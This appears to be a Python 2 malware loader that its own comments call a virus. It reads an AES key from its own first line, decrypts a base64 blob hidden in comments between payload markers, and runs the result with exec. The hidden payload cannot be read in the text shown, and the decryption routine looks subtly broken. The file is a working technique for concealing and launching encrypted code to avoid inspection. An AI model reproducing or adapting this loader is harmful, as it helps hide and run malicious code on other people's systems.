print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload